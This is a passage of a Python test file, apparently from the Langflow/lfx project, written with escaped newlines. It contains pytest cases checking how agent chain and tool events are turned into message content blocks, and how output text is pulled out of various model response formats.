handle_on_tool_start,\\n    process_agent_events,\\n)\\nfrom lfx.schema.content_types import ToolContent\\nfrom lfx.schema.message import Message\\nfrom lfx.utils.constants import MESSAGE_SENDER_AI\\n\\n\\nasync def create_event_iterator(events: list[dict[str, Any]]) -> AsyncIterator[dict[str, Any]]:\\n    \\\"\\\"\\\"Helper function to create an async iterator from a list of events.\\\"\\\"\\\"\\n    for event in events:\\n        yield event\\n\\n\\ndef create_mock_send_message():\\n    \\\"\\\"\\\"Create a mock send_message callback that simulates database ID assignment.\\n\\n    In production, the first call to send_message persists to the database and assigns an ID.\\n    This mock simulates that behavior for testing.\\n    \\\"\\\"\\\"\\n    call_count = [0]\\n\\n    def mock_send_message(message, skip_db_update=False):  # noqa: ARG001, FBT002\\n        call_count[0] += 1\\n        if call_count[0] == 1:\\n            # Simulate production: add ID on first call (when persisting to DB)\\n            message.data[\\\"id\\\"] = \\\"test-message-id\\\"\\n        return message\\n\\n    return AsyncMock(side_effect=mock_send_message)\\n\\n\\n@pytest.mark.asyncio\\nasync def test_chain_start_event():\\n    \\\"\\\"\\\"Test handling of on_chain_start event.\\\"\\\"\\\"\\n    send_message = create_mock_send_message()\\n\\n    events = [\\n        {\\\"event\\\": \\\"on_chain_start\\\", \\\"data\\\": {\\\"input\\\": {\\\"input\\\": \\\"test input\\\", \\\"chat_history\\\": []}}, \\\"start_time\\\": 0}\\n    ]\\n\\n    # Initialize message with content blocks\\n    agent_message = Message(\\n        sender=MESSAGE_SENDER_AI,\\n        sender_name=\\\"Agent\\\",\\n        properties={\\\"icon\\\": \\\"Bot\\\", \\\"state\\\": \\\"partial\\\"},\\n        content_blocks=[],\\n        session_id=\\\"test_session_id\\\",\\n    )\\n\\n    result = await process_agent_events(create_event_iterator(events), agent_message, send_message)\\n\\n    assert result.properties.icon == \\\"Bot\\\"\\n    # handle_on_chain_start is a no-op in the flat content_blocks design --\\n    # the user's input is already rendered above the agent reply, so we no\\n    # longer echo it as a synthetic \\\"Input\\\" TextContent.\\n    assert result.content_blocks == []\\n\\n\\n@pytest.mark.asyncio\\nasync def test_chain_end_event():\\n    \\\"\\\"\\\"Test handling of on_chain_end event.\\\"\\\"\\\"\\n    send_message = create_mock_send_message()\\n\\n    # Create a mock AgentFinish output\\n    output = AgentFinish(return_values={\\\"output\\\": \\\"final output\\\"}, log=\\\"test log\\\")\\n\\n    events = [{\\\"event\\\": \\\"on_chain_end\\\", \\\"data\\\": {\\\"output\\\": output}, \\\"start_time\\\": 0}]\\n\\n    # Initialize message with content blocks\\n    agent_message = Message(\\n        sender=MESSAGE_SENDER_AI,\\n        sender_name=\\\"Agent\\\",\\n        properties={\\\"icon\\\": \\\"Bot\\\", \\\"state\\\": \\\"partial\\\"},\\n        content_blocks=[],\\n        session_id=\\\"test_session_id\\\",\\n    )\\n\\n    result = await process_agent_events(create_event_iterator(events), agent_message, send_message)\\n\\n    assert result.properties.icon == \\\"Bot\\\"\\n    assert result.properties.state == \\\"complete\\\"\\n    assert result.text == \\\"final output\\\"\\n\\n\\n@pytest.mark.asyncio\\nasync def test_tool_start_event():\\n    \\\"\\\"\\\"Test handling of on_tool_start event.\\\"\\\"\\\"\\n    call_count = [0]\\n\\n    def update_message(message, skip_db_update=False):  # noqa: ARG001, FBT002\\n        call_count[0] += 1\\n        if call_count[0] == 1:\\n            # Simulate production: add ID on first call (when persisting to DB)\\n            message.data[\\\"id\\\"] = \\\"test-message-id\\\"\\n        # Return a copy of the message to simulate real behavior\\n        return Message(**message.model_dump())\\n\\n    send_message = AsyncMock(side_effect=update_message)\\n\\n    events = [\\n        {\\n            \\\"event\\\": \\\"on_tool_start\\\",\\n            \\\"name\\\": \\\"test_tool\\\",\\n            \\\"run_id\\\": \\\"test_run\\\",\\n            \\\"data\\\": {\\\"input\\\": {\\\"query\\\": \\\"tool input\\\"}},\\n            \\\"start_time\\\": 0,\\n        }\\n    ]\\n    agent_message = Message(\\n        sender=MESSAGE_SENDER_AI,\\n        sender_name=\\\"Agent\\\",\\n        properties={\\\"icon\\\": \\\"Bot\\\", \\\"state\\\": \\\"partial\\\"},\\n        content_blocks=[],\\n        session_id=\\\"test_session_id\\\",\\n    )\\n    result = await process_agent_events(create_event_iterator(events), agent_message, send_message)\\n\\n    assert result.properties.icon == \\\"Bot\\\"\\n    # Flat content_blocks: the ToolContent is the only entry, at index 0.\\n    assert len(result.content_blocks) == 1\\n    tool_content = result.content_blocks[-1]\\n    assert isinstance(tool_content, ToolContent)\\n    assert tool_content.name == \\\"test_tool\\\"\\n    assert tool_content.tool_input == {\\\"query\\\": \\\"tool input\\\"}, tool_content\\n\\n\\n@pytest.mark.asyncio\\nasync def test_tool_end_event():\\n    \\\"\\\"\\\"Test handling of on_tool_end event.\\\"\\\"\\\"\\n    send_message = create_mock_send_message()\\n\\n    events = [\\n        {\\n            \\\"event\\\": \\\"on_tool_start\\\",\\n            \\\"name\\\": \\\"test_tool\\\",\\n            \\\"run_id\\\": \\\"test_run\\\",\\n            \\\"data\\\": {\\\"input\\\": {\\\"query\\\": \\\"tool input\\\"}},\\n            \\\"start_time\\\": 0,\\n        },\\n        {\\n            \\\"event\\\": \\\"on_tool_end\\\",\\n            \\\"name\\\": \\\"test_tool\\\",\\n            \\\"run_id\\\": \\\"test_run\\\",\\n            \\\"data\\\": {\\\"output\\\": \\\"tool output\\\"},\\n            \\\"start_time\\\": 0,\\n        },\\n    ]\\n    agent_message = Message(\\n        sender=MESSAGE_SENDER_AI,\\n        sender_name=\\\"Agent\\\",\\n        properties={\\\"icon\\\": \\\"Bot\\\", \\\"state\\\": \\\"partial\\\"},\\n        content_blocks=[],\\n        session_id=\\\"test_session_id\\\",\\n    )\\n    result = await process_agent_events(create_event_iterator(events), agent_message, send_message)\\n\\n    assert len(result.content_blocks) == 1\\n    tool_content = result.content_blocks[-1]\\n    assert tool_content.name == \\\"test_tool\\\"\\n    assert tool_content.output == \\\"tool output\\\"\\n\\n\\n@pytest.mark.asyncio\\nasync def test_tool_error_event():\\n    \\\"\\\"\\\"Test handling of on_tool_error event.\\\"\\\"\\\"\\n    send_message = create_mock_send_message()\\n\\n    events = [\\n        {\\n            \\\"event\\\": \\\"on_tool_start\\\",\\n            \\\"name\\\": \\\"test_tool\\\",\\n            \\\"run_id\\\": \\\"test_run\\\",\\n            \\\"data\\\": {\\\"input\\\": {\\\"query\\\": \\\"tool input\\\"}},\\n            \\\"start_time\\\": 0,\\n        },\\n        {\\n            \\\"event\\\": \\\"on_tool_error\\\",\\n            \\\"name\\\": \\\"test_tool\\\",\\n            \\\"run_id\\\": \\\"test_run\\\",\\n            \\\"data\\\": {\\\"error\\\": \\\"error message\\\"},\\n            \\\"start_time\\\": 0,\\n        },\\n    ]\\n    agent_message = Message(\\n        sender=MESSAGE_SENDER_AI,\\n        sender_name=\\\"Agent\\\",\\n        properties={\\\"icon\\\": \\\"Bot\\\", \\\"state\\\": \\\"partial\\\"},\\n        content_blocks=[],\\n        session_id=\\\"test_session_id\\\",\\n    )\\n\\n    result = await process_agent_events(create_event_iterator(events), agent_message, send_message)\\n\\n    tool_content = result.content_blocks[-1]\\n    assert tool_content.name == \\\"test_tool\\\"\\n    assert tool_content.error == \\\"error message\\\"\\n    assert tool_content.header[\\\"title\\\"] == \\\"Error using **test_tool**\\\"\\n\\n\\n@pytest.mark.asyncio\\nasync def test_chain_stream_event():\\n    \\\"\\\"\\\"Test handling of on_chain_stream event.\\\"\\\"\\\"\\n    send_message = create_mock_send_message()\\n\\n    events = [{\\\"event\\\": \\\"on_chain_stream\\\", \\\"data\\\": {\\\"chunk\\\": {\\\"output\\\": \\\"streamed output\\\"}}, \\\"start_time\\\": 0}]\\n    agent_message = Message(\\n        sender=MESSAGE_SENDER_AI,\\n        sender_name=\\\"Agent\\\",\\n        properties={\\\"icon\\\": \\\"Bot\\\", \\\"state\\\": \\\"partial\\\"},\\n        content_blocks=[],\\n        session_id=\\\"test_session_id\\\",\\n    )\\n    result = await process_agent_events(create_event_iterator(events), agent_message, send_message)\\n\\n    assert result.properties.state == \\\"complete\\\"\\n    assert result.text == \\\"streamed output\\\"\\n\\n\\n@pytest.mark.asyncio\\nasync def test_multiple_events():\\n    \\\"\\\"\\\"Test handling of multiple events in sequence.\\\"\\\"\\\"\\n    send_message = create_mock_send_message()\\n\\n    # Create a mock AgentFinish output instead of MockOutput\\n    output = AgentFinish(return_values={\\\"output\\\": \\\"final output\\\"}, log=\\\"test log\\\")\\n\\n    events = [\\n        {\\\"event\\\": \\\"on_chain_start\\\", \\\"data\\\": {\\\"input\\\": {\\\"input\\\": \\\"initial input\\\", \\\"chat_history\\\": []}}, \\\"start_time\\\": 0},\\n        {\\n            \\\"event\\\": \\\"on_tool_start\\\",\\n            \\\"name\\\": \\\"test_tool\\\",\\n            \\\"run_id\\\": \\\"test_run\\\",\\n            \\\"data\\\": {\\\"input\\\": {\\\"query\\\": \\\"tool input\\\"}},\\n            \\\"start_time\\\": 0,\\n        },\\n        {\\n            \\\"event\\\": \\\"on_tool_end\\\",\\n            \\\"name\\\": \\\"test_tool\\\",\\n            \\\"run_id\\\": \\\"test_run\\\",\\n            \\\"data\\\": {\\\"output\\\": \\\"tool output\\\"},\\n            \\\"start_time\\\": 0,\\n        },\\n        {\\\"event\\\": \\\"on_chain_end\\\", \\\"data\\\": {\\\"output\\\": output}, \\\"start_time\\\": 0},\\n    ]\\n\\n    # Initialize message with content blocks\\n    agent_message = Message(\\n        sender=MESSAGE_SENDER_AI,\\n        sender_name=\\\"Agent\\\",\\n        properties={\\\"icon\\\": \\\"Bot\\\", \\\"state\\\": \\\"partial\\\"},\\n        content_blocks=[],\\n    )\\n\\n    result = await process_agent_events(create_event_iterator(events), agent_message, send_message)\\n\\n    assert result.properties.state == \\\"complete\\\"\\n    assert result.properties.icon == \\\"Bot\\\"\\n    # No on_chat_model_end in the stream, so the interleaved-text path\\n    # doesn't fire; we get just the ToolContent that on_tool_start\\n    # appended (via its fallback path) and that on_tool_end filled in.\\n    # handle_on_chain_end stashes the final text in data[\\\"text\\\"] but\\n    # doesn't append a synthetic TextContent \u2014 Message.text's getter\\n    # falls back to data[\\\"text\\\"] when content_blocks has no TextContent.\\n    assert len(result.content_blocks) == 1\\n    assert isinstance(result.content_blocks[0], ToolContent)\\n    assert result.content_blocks[0].output == \\\"tool output\\\"\\n    assert result.text == \\\"final output\\\"\\n\\n\\n@pytest.mark.asyncio\\nasync def test_unknown_event():\\n    \\\"\\\"\\\"Test handling of unknown event type.\\\"\\\"\\\"\\n    send_message = create_mock_send_message()\\n    agent_message = Message(\\n        sender=MESSAGE_SENDER_AI,\\n        sender_name=\\\"Agent\\\",\\n        properties={\\\"icon\\\": \\\"Bot\\\", \\\"state\\\": \\\"partial\\\"},\\n        content_blocks=[],  # Initialize with empty content block\\n    )\\n\\n    events = [{\\\"event\\\": \\\"unknown_event\\\", \\\"data\\\": {\\\"some\\\": \\\"data\\\"}, \\\"start_time\\\": 0}]\\n\\n    result = await process_agent_events(create_event_iterator(events), agent_message, send_message)\\n\\n    # Should complete without error and maintain default state\\n    assert result.properties.state == \\\"complete\\\"\\n    # Unknown events should not touch content_blocks.\\n    assert result.content_blocks == []\\n\\n\\n# Additional tests for individual handler functions\\n\\n\\n@pytest.mark.asyncio\\nasync def test_handle_on_chain_start_with_input():\\n    \\\"\\\"\\\"Test handle_on_chain_start with input.\\\"\\\"\\\"\\n    send_message = AsyncMock(side_effect=lambda message, skip_db_update=False: message)  # noqa: ARG005\\n    agent_message = Message(\\n        sender=MESSAGE_SENDER_AI,\\n        sender_name=\\\"Agent\\\",\\n        properties={\\\"icon\\\": \\\"Bot\\\", \\\"state\\\": \\\"partial\\\"},\\n        content_blocks=[],\\n    )\\n    event = {\\\"event\\\": \\\"on_chain_start\\\", \\\"data\\\": {\\\"input\\\": {\\\"input\\\": \\\"test input\\\", \\\"chat_history\\\": []}}, \\\"start_time\\\": 0}\\n\\n    updated_message, start_time = await handle_on_chain_start(event, agent_message, send_message, None, 0.0)\\n\\n    assert updated_message.properties.icon == \\\"Bot\\\"\\n    # No-op handler: content_blocks stays untouched.\\n    assert updated_message.content_blocks == []\\n    assert isinstance(start_time, float)\\n\\n\\n@pytest.mark.asyncio\\nasync def test_handle_on_chain_start_no_input():\\n    \\\"\\\"\\\"Test handle_on_chain_start without input.\\\"\\\"\\\"\\n    send_message = AsyncMock(side_effect=lambda message, skip_db_update=False: message)  # noqa: ARG005\\n    agent_message = Message(\\n        sender=MESSAGE_SENDER_AI,\\n        sender_name=\\\"Agent\\\",\\n        properties={\\\"icon\\\": \\\"Bot\\\", \\\"state\\\": \\\"partial\\\"},\\n        content_blocks=[],\\n    )\\n    event = {\\\"event\\\": \\\"on_chain_start\\\", \\\"data\\\": {}, \\\"start_time\\\": 0}\\n\\n    updated_message, start_time = await handle_on_chain_start(event, agent_message, send_message, None, 0.0)\\n\\n    assert updated_message.properties.icon == \\\"Bot\\\"\\n    # No-op handler: content_blocks stays untouched.\\n    assert updated_message.content_blocks == []\\n    assert isinstance(start_time, float)\\n\\n\\n@pytest.mark.asyncio\\nasync def test_handle_on_chain_end_with_output():\\n    \\\"\\\"\\\"Test handle_on_chain_end with output.\\\"\\\"\\\"\\n    send_message = AsyncMock(side_effect=lambda message, skip_db_update=False: message)  # noqa: ARG005\\n    agent_message = Message(\\n        sender=MESSAGE_SENDER_AI,\\n        sender_name=\\\"Agent\\\",\\n        properties={\\\"icon\\\": \\\"Bot\\\", \\\"state\\\": \\\"partial\\\"},\\n        content_blocks=[],\\n    )\\n\\n    output = AgentFinish(return_values={\\\"output\\\": \\\"final output\\\"}, log=\\\"test log\\\")\\n    event = {\\\"event\\\": \\\"on_chain_end\\\", \\\"data\\\": {\\\"output\\\": output}, \\\"start_time\\\": 0}\\n\\n    updated_message, start_time = await handle_on_chain_end(event, agent_message, send_message, None, 0.0)\\n\\n    assert updated_message.properties.icon == \\\"Bot\\\"\\n    assert updated_message.properties.state == \\\"complete\\\"\\n    assert updated_message.text == \\\"final output\\\"\\n    assert isinstance(start_time, float)\\n\\n\\n@pytest.mark.asyncio\\nasync def test_handle_on_chain_end_no_output():\\n    \\\"\\\"\\\"Test handle_on_chain_end without output key in data.\\\"\\\"\\\"\\n    send_message = AsyncMock(side_effect=lambda message, skip_db_update=False: message)  # noqa: ARG005\\n    agent_message = Message(\\n        sender=MESSAGE_SENDER_AI,\\n        sender_name=\\\"Agent\\\",\\n        properties={\\\"icon\\\": \\\"Bot\\\", \\\"state\\\": \\\"partial\\\"},\\n        content_blocks=[],\\n    )\\n    event = {\\\"event\\\": \\\"on_chain_end\\\", \\\"data\\\": {}, \\\"start_time\\\": 0}\\n\\n    updated_message, start_time = await handle_on_chain_end(event, agent_message, send_message, None, 0.0)\\n\\n    assert updated_message.properties.icon == \\\"Bot\\\"\\n    assert updated_message.properties.state == \\\"partial\\\"\\n    assert updated_message.text == \\\"\\\"\\n    assert isinstance(start_time, float)\\n\\n\\n@pytest.mark.asyncio\\nasync def test_handle_on_chain_end_empty_data():\\n    \\\"\\\"\\\"Test handle_on_chain_end with empty data.\\\"\\\"\\\"\\n    send_message = AsyncMock(side_effect=lambda message, skip_db_update=False: message)  # noqa: ARG005\\n    agent_message = Message(\\n        sender=MESSAGE_SENDER_AI,\\n        sender_name=\\\"Agent\\\",\\n        properties={\\\"icon\\\": \\\"Bot\\\", \\\"state\\\": \\\"partial\\\"},\\n        content_blocks=[],\\n    )\\n    event = {\\\"event\\\": \\\"on_chain_end\\\", \\\"data\\\": {\\\"output\\\": None}, \\\"start_time\\\": 0}\\n\\n    updated_message, start_time = await handle_on_chain_end(event, agent_message, send_message, None, 0.0)\\n\\n    assert updated_message.properties.icon == \\\"Bot\\\"\\n    assert updated_message.properties.state == \\\"partial\\\"\\n    assert updated_message.text == \\\"\\\"\\n    assert isinstance(start_time, float)\\n\\n\\n@pytest.mark.asyncio\\nasync def test_handle_on_chain_end_with_empty_return_values():\\n    \\\"\\\"\\\"Test handle_on_chain_end with empty return_values.\\\"\\\"\\\"\\n    send_message = AsyncMock(side_effect=lambda message, skip_db_update=False: message)  # noqa: ARG005\\n    agent_message = Message(\\n        sender=MESSAGE_SENDER_AI,\\n        sender_name=\\\"Agent\\\",\\n        properties={\\\"icon\\\": \\\"Bot\\\", \\\"state\\\": \\\"partial\\\"},\\n        content_blocks=[],\\n    )\\n\\n    class MockOutputEmptyReturnValues:\\n        def __init__(self):\\n            self.return_values = {}\\n\\n    event = {\\\"event\\\": \\\"on_chain_end\\\", \\\"data\\\": {\\\"output\\\": MockOutputEmptyReturnValues()}, \\\"start_time\\\": 0}\\n\\n    updated_message, start_time = await handle_on_chain_end(event, agent_message, send_message, None, 0.0)\\n\\n    assert updated_message.properties.icon == \\\"Bot\\\"\\n    assert updated_message.properties.state == \\\"partial\\\"\\n    assert updated_message.text == \\\"\\\"\\n    assert isinstance(start_time, float)\\n\\n\\n@pytest.mark.asyncio\\nasync def test_handle_on_tool_start():\\n    \\\"\\\"\\\"Test handle_on_tool_start event.\\\"\\\"\\\"\\n    send_message = AsyncMock(side_effect=lambda message, skip_db_update=False: message)  # noqa: ARG005\\n    tool_blocks_map = {}\\n    agent_message = Message(\\n        sender=MESSAGE_SENDER_AI,\\n        sender_name=\\\"Agent\\\",\\n        properties={\\\"icon\\\": \\\"Bot\\\", \\\"state\\\": \\\"partial\\\"},\\n        content_blocks=[],\\n    )\\n    event = {\\n        \\\"event\\\": \\\"on_tool_start\\\",\\n        \\\"name\\\": \\\"test_tool\\\",\\n        \\\"run_id\\\": \\\"test_run\\\",\\n        \\\"data\\\": {\\\"input\\\": {\\\"query\\\": \\\"tool input\\\"}},\\n        \\\"start_time\\\": 0,\\n    }\\n\\n    updated_message, start_time = await handle_on_tool_start(event, agent_message, tool_blocks_map, send_message, 0.0)\\n\\n    assert len(updated_message.content_blocks) == 1\\n    assert len(updated_message.content_blocks) > 0\\n    tool_key = f\\\"{event['name']}_{event['run_id']}\\\"\\n    tool_content = updated_message.content_blocks[-1]\\n    assert tool_content == tool_blocks_map.get(tool_key)\\n    assert isinstance(tool_content, ToolContent)\\n    assert tool_content.name == \\\"test_tool\\\"\\n    assert tool_content.tool_input == {\\\"query\\\": \\\"tool input\\\"}\\n    assert isinstance(tool_content.duration, int)\\n    assert isinstance(start_time, float)\\n\\n\\n@pytest.mark.asyncio\\nasync def test_handle_on_tool_end():\\n    \\\"\\\"\\\"Test handle_on_tool_end event.\\\"\\\"\\\"\\n    send_message = AsyncMock(side_effect=lambda message, skip_db_update=False: message)  # noqa: ARG005\\n    tool_blocks_map = {}\\n    agent_message = Message(\\n        sender=MESSAGE_SENDER_AI,\\n        sender_name=\\\"Agent\\\",\\n        properties={\\\"icon\\\": \\\"Bot\\\", \\\"state\\\": \\\"partial\\\"},\\n        content_blocks=[],\\n    )\\n\\n    start_event = {\\n        \\\"event\\\": \\\"on_tool_start\\\",\\n        \\\"name\\\": \\\"test_tool\\\",\\n        \\\"run_id\\\": \\\"test_run\\\",\\n        \\\"data\\\": {\\\"input\\\": {\\\"query\\\": \\\"tool input\\\"}},\\n    }\\n    agent_message, _ = await handle_on_tool_start(start_event, agent_message, tool_blocks_map, send_message, 0.0)\\n\\n    end_event = {\\n        \\\"event\\\": \\\"on_tool_end\\\",\\n        \\\"name\\\": \\\"test_tool\\\",\\n        \\\"run_id\\\": \\\"test_run\\\",\\n        \\\"data\\\": {\\\"output\\\": \\\"tool output\\\"},\\n        \\\"start_time\\\": 0,\\n    }\\n\\n    updated_message, start_time = await handle_on_tool_end(end_event, agent_message, tool_blocks_map, send_message, 0.0)\\n\\n    f\\\"{end_event['name']}_{end_event['run_id']}\\\"\\n    tool_content = updated_message.content_blocks[-1]\\n    assert tool_content.name == \\\"test_tool\\\"\\n    assert tool_content.output == \\\"tool output\\\"\\n    assert isinstance(tool_content.duration, int)\\n    assert isinstance(start_time, float)\\n\\n\\n@pytest.mark.asyncio\\nasync def test_handle_on_tool_error():\\n    \\\"\\\"\\\"Test handle_on_tool_error event.\\\"\\\"\\\"\\n    send_message = AsyncMock(side_effect=lambda message, skip_db_update=False: message)  # noqa: ARG005\\n    tool_blocks_map = {}\\n    agent_message = Message(\\n        sender=MESSAGE_SENDER_AI,\\n        sender_name=\\\"Agent\\\",\\n        properties={\\\"icon\\\": \\\"Bot\\\", \\\"state\\\": \\\"partial\\\"},\\n        content_blocks=[],\\n    )\\n\\n    start_event = {\\n        \\\"event\\\": \\\"on_tool_start\\\",\\n        \\\"name\\\": \\\"test_tool\\\",\\n        \\\"run_id\\\": \\\"test_run\\\",\\n        \\\"data\\\": {\\\"input\\\": {\\\"query\\\": \\\"tool input\\\"}},\\n    }\\n    agent_message, _ = await handle_on_tool_start(start_event, agent_message, tool_blocks_map, send_message, 0.0)\\n\\n    error_event = {\\n        \\\"event\\\": \\\"on_tool_error\\\",\\n        \\\"name\\\": \\\"test_tool\\\",\\n        \\\"run_id\\\": \\\"test_run\\\",\\n        \\\"data\\\": {\\\"error\\\": \\\"error message\\\"},\\n        \\\"start_time\\\": 0,\\n    }\\n\\n    updated_message, start_time = await handle_on_tool_error(\\n        error_event, agent_message, tool_blocks_map, send_message, 0.0\\n    )\\n\\n    tool_content = updated_message.content_blocks[-1]\\n    assert tool_content.name == \\\"test_tool\\\"\\n    assert tool_content.error == \\\"error message\\\"\\n    assert tool_content.header[\\\"title\\\"] == \\\"Error using **test_tool**\\\"\\n    assert isinstance(tool_content.duration, int)\\n    assert isinstance(start_time, float)\\n\\n\\n@pytest.mark.asyncio\\nasync def test_handle_on_chain_stream_with_output():\\n    \\\"\\\"\\\"Test handle_on_chain_stream with output.\\\"\\\"\\\"\\n    send_message = AsyncMock(side_effect=lambda message, skip_db_update=False: message)  # noqa: ARG005\\n    agent_message = Message(\\n        sender=MESSAGE_SENDER_AI,\\n        sender_name=\\\"Agent\\\",\\n        properties={\\\"icon\\\": \\\"Bot\\\", \\\"state\\\": \\\"partial\\\"},\\n        content_blocks=[],\\n    )\\n    event = {\\n        \\\"event\\\": \\\"on_chain_stream\\\",\\n        \\\"data\\\": {\\\"chunk\\\": {\\\"output\\\": \\\"streamed output\\\"}},\\n    }\\n\\n    updated_message, start_time = await handle_on_chain_stream(event, agent_message, send_message, None, 0.0)\\n\\n    assert updated_message.text == \\\"streamed output\\\"\\n    assert updated_message.properties.state == \\\"complete\\\"\\n    assert isinstance(start_time, float)\\n\\n\\n@pytest.mark.asyncio\\nasync def test_handle_on_chain_stream_no_output():\\n    \\\"\\\"\\\"Test handle_on_chain_stream without output.\\\"\\\"\\\"\\n    send_message = AsyncMock(side_effect=lambda message, skip_db_update=False: message)  # noqa: ARG005\\n    agent_message = Message(\\n        sender=MESSAGE_SENDER_AI,\\n        sender_name=\\\"Agent\\\",\\n        properties={\\\"icon\\\": \\\"Bot\\\", \\\"state\\\": \\\"partial\\\"},\\n        content_blocks=[],\\n        session_id=\\\"test_session_id\\\",\\n    )\\n    event = {\\n        \\\"event\\\": \\\"on_chain_stream\\\",\\n        \\\"data\\\": {\\\"chunk\\\": {}},\\n    }\\n\\n    updated_message, start_time = await handle_on_chain_stream(event, agent_message, send_message, None, 0.0)\\n\\n    assert updated_message.text == \\\"\\\"\\n    assert updated_message.properties.state == \\\"partial\\\"\\n    assert isinstance(start_time, float)\\n\\n\\n# Comprehensive tests for _extract_output_text function\\n\\n\\ndef test_extract_output_text_string_input():\\n    \\\"\\\"\\\"Test _extract_output_text with string input (backward compatibility).\\\"\\\"\\\"\\n    result = _extract_output_text(\\\"simple text output\\\")\\n    assert result == \\\"simple text output\\\"\\n\\n\\ndef test_extract_output_text_empty_string():\\n    \\\"\\\"\\\"Test _extract_output_text with empty string.\\\"\\\"\\\"\\n    result = _extract_output_text(\\\"\\\")\\n    assert result == \\\"\\\"\\n\\n\\ndef test_extract_output_text_empty_list():\\n    \\\"\\\"\\\"Test _extract_output_text with empty list.\\\"\\\"\\\"\\n    result = _extract_output_text([])\\n    assert result == \\\"\\\"\\n\\n\\ndef test_extract_output_text_single_string_in_list():\\n    \\\"\\\"\\\"Test _extract_output_text with single string in list.\\\"\\\"\\\"\\n    result = _extract_output_text([\\\"text content\\\"])\\n    assert result == \\\"text content\\\"\\n\\n\\ndef test_extract_output_text_single_dict_with_text():\\n    \\\"\\\"\\\"Test _extract_output_text with single dict containing 'text' key (backward compatibility).\\\"\\\"\\\"\\n    result = _extract_output_text([{\\\"text\\\": \\\"message content\\\"}])\\n    assert result == \\\"message content\\\"\\n\\n\\ndef test_extract_output_text_tool_use_type():\\n    \\\"\\\"\\\"Test _extract_output_text with tool_use type (backward compatibility).\\\"\\\"\\\"\\n    result = _extract_output_text([{\\\"type\\\": \\\"tool_use\\\", \\\"name\\\": \\\"some_tool\\\"}])\\n    assert result == \\\"\\\"\\n\\n\\ndef test_extract_output_text_partial_json():\\n    \\\"\\\"\\\"Test _extract_output_text with partial_json (backward compatibility).\\\"\\\"\\\"\\n    result = _extract_output_text([{\\\"partial_json\\\": '{\\\"incomplete\\\": true'}])\\n    assert result == \\\"\\\"\\n\\n\\ndef test_extract_output_text_chatbedrockconverse_index_only():\\n    \\\"\\\"\\\"Test _extract_output_text with ChatBedrockConverse index-only format (NEW FIX).\\\"\\\"\\\"\\n    # This is the specific case that was failing before the fix\\n    result = _extract_output_text([{\\\"index\\\": 0}])\\n    assert result == \\\"\\\"\\n\\n\\ndef test_extract_output_text_chatbedrockconverse_index_with_extra_data():\\n    \\\"\\\"\\\"Test _extract_output_text with ChatBedrockConverse index plus other data.\\\"\\\"\\\"\\n    result = _extract_output_text([{\\\"index\\\": 0, \\\"some_other_field\\\": \\\"value\\\"}])\\n    assert result == \\\"\\\"\\n\\n\\ndef test_extract_output_text_multiple_items_mixed():\\n    \\\"\\\"\\\"Test _extract_output_text with multiple items including text and non-text.\\\"\\\"\\\"\\n    result = _extract_output_text(\\n        [{\\\"text\\\": \\\"First part\\\"}, {\\\"type\\\": \\\"tool_use\\\", \\\"name\\\": \\\"some_tool\\\"}, {\\\"text\\\": \\\"Second part\\\"}, {\\\"index\\\": 0}]\\n    )\\n    assert result == \\\"First partSecond part\\\"\\n\\n\\ndef test_extract_output_text_multiple_strings():\\n    \\\"\\\"\\\"Test _extract_output_text with multiple strings in list.\\\"\\\"\\\"\\n    result = _extract_output_text([\\\"Hello\\\", \\\" \\\", \\\"World\\\"])\\n    assert result == \\\"Hello World\\\"\\n\\n\\ndef test_extract_output_text_mixed_strings_and_dicts():\\n    \\\"\\\"\\\"Test _extract_output_text with mixed strings and text dicts.\\\"\\\"\\\"\\n    result = _extract_output_text([\\\"Start: \\\", {\\\"text\\\": \\\"middle content\\\"}, \\\" End.\\\"])\\n    assert result == \\\"Start: middle content End.\\\"\\n\\n\\ndef test_extract_output_text_complex_chatbedrockconverse_response():\\n    \\\"\\\"\\\"Test _extract_output_text with complex ChatBedrockConverse-like response.\\\"\\\"\\\"\\n    result = _extract_output_text(\\n        [\\n            {\\\"type\\\": \\\"text\\\", \\\"text\\\": \\\"I'll help you with that.\\\", \\\"index\\\": 0},\\n            {\\\"type\\\": \\\"tool_use\\\", \\\"name\\\": \\\"get_weather\\\", \\\"id\\\": \\\"tool_123\\\", \\\"index\\\": 1},\\n            {\\\"index\\\": 2},  # Index-only item\\n        ]\\n    )\\n    assert result == \\\"I'll help you with that.\\\"\\n\\n\\ndef test_extract_output_text_all_non_text_items():\\n    \\\"\\\"\\\"Test _extract_output_text with all non-text items.\\\"\\\"\\\"\\n    result = _extract_output_text(\\n        [{\\\"type\\\": \\\"tool_use\\\", \\\"name\\\": \\\"some_tool\\\"}, {\\\"index\\\": 0}, {\\\"partial_json\\\": '{\\\"incomplete\\\": true'}]\\n    )\\n    assert result == \\\"\\\"\\n\\n\\ndef test_extract_output_text_anthropic_style():\\n    \\\"\\\"\\\"Test _extract_output_text with Anthropic-style response format.\\\"\\\"\\\"\\n    result = _extract_output_text(\\n        [\\n            {\\\"type\\\": \\\"text\\\", \\\"text\\\": \\\"Here's my response\\\"},\\n            {\\\"type\\\": \\\"tool_use\\\", \\\"name\\\": \\\"calculator\\\", \\\"input\\\": {\\\"expression\\\": \\\"2+2\\\"}},\\n        ]\\n    )\\n    assert result == \\\"Here's my response\\\"\\n\\n\\ndef test_extract_output_text_edge_case_none_values():\\n    \\\"\\\"\\\"Test _extract_output_text with None/null values in dicts.\\\"\\\"\\\"\\n    result = _extract_output_text([{\\\"text\\\": None}, {\\\"text\\\": \\\"valid text\\\"}, {\\\"index\\\": None}])\\n    assert result == \\\"valid text\\\"\\n\\n\\ndef test_extract_output_text_edge_case_empty_text():\\n    \\\"\\\"\\\"Test _extract_output_text with empty text values.\\\"\\\"\\\"\\n    result = _extract_output_text([{\\\"text\\\": \\\"\\\"}, {\\\"text\\\": \\\"actual content\\\"}, {\\\"text\\\": \\\"\\\"}])\\n    assert result == \\\"actual content\\\"\\n\\n\\ndef test_extract_output_text_single_dict_no_text_key():\\n    \\\"\\\"\\\"Test _extract_output_text with dict that has no text key (graceful handling).\\\"\\\"\\\"\\n    result = _extract_output_text([{\\\"some_field\\\": \\\"some_value\\\"}])\\n    assert result == \\\"\\\"\\n\\n\\ndef test_extract_output_text_single_dict_multiple_keys_no_text():\\n    \\\"\\\"\\\"Test _extract_output_text with dict having multiple keys but no text.\\\"\\\"\\\"\\n    result = _extract_output_text([{\\\"field1\\\": \\\"value1\\\", \\\"field2\\\": \\\"value2\\\"}])\\n    assert result == \\\"\\\"\\n\\n\\ndef test_extract_output_text_realistic_streaming_scenario():\\n    \\\"\\\"\\\"Test _extract_output_text with realistic streaming scenario.\\\"\\\"\\\"\\n    